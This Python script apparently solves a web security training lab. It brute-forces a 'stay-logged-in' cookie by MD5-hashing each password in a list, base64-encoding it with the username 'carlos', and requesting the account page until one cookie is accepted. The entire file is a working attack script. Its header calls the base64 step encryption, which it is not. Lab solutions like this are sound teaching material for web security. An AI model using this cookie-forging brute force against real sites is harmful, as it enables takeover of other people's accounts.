####################################################################
#
# Lab: Brute-forcing a stay-logged-in cookie
#
# Hack Steps: 
#      1. Read password list
#      2. Hash every the password
#      3. Encrypt every tha hash with the username in the cookie
#      4. Fetch carlos profile with every encrypted cookie
#
####################################################################

#N feito
import requests
import time
import os
from colorama import Fore
import hashlib
import base64

# Change this to your lab URL
LAB_URL = "https://0a69006304520f4a83e7736500680062.web-security-academy.net"

SCRIPT_START_TIME = time.time()

def main():
    print("⦗1⦘ Reading password list.. ", end="", flush=True)

    password_list = read_password_list(os.path.join(os.path.dirname(os.path.abspath(__file__)), "passwords.txt"))

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Brute forcing carlos password..")

    valid_password = brute_force_password(password_list)

    if valid_password == None:
        print(Fore.RED + "⦗!⦘ No valid passwords was found")
    

def brute_force_password(passwords):
    passwords_count = len(passwords) 

    for (counter, password) in enumerate(passwords):
        password_hash = hashlib.md5(password.encode()).hexdigest()
        cookie_encoded = base64.b64encode(f"carlos:{password_hash}".encode()).decode()

        cookies = { "stay-logged-in": cookie_encoded }
        login_as_carlos = fetch("/my-account", cookies)

        if login_as_carlos.status_code == 200:  
            print_finish_message(password)
            return password
        else:
            print_progress(counter, passwords_count, password)
            continue


def read_password_list(file_path):
    try:
        return open(file_path, 'rt').read().splitlines()
    except:
        print(Fore.RED + "⦗!⦘ Failed to opent the file " + file_path + " through exception")
        exit(1)


def fetch(path, cookies):
    try:  
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
 

def post_data(path, json):
    try:    
        return requests.post(f"{LAB_URL}{path}", json=json, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + path + " through exception")


def print_progress(counter, total_counts, text):
    elapsed_time = (int((time.time() - SCRIPT_START_TIME)))
    print(Fore.WHITE + "❯❯ Elapsed: " + Fore.YELLOW + str(elapsed_time) +
           Fore.WHITE + f" seconds || Trying ({counter+1}/{total_counts}): " + Fore.BLUE + f"{text:50}", end='\r', flush=True)


def print_finish_message(password):
    print(Fore.WHITE + f"\n🗹 Correct password: " + Fore.GREEN + password)
    elapsed_time = int((time.time() - SCRIPT_START_TIME))  
    print(Fore.WHITE + "🗹 Finished in: " + Fore.YELLOW + str(elapsed_time) + " seconds")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


if __name__ == "__main__":
    main()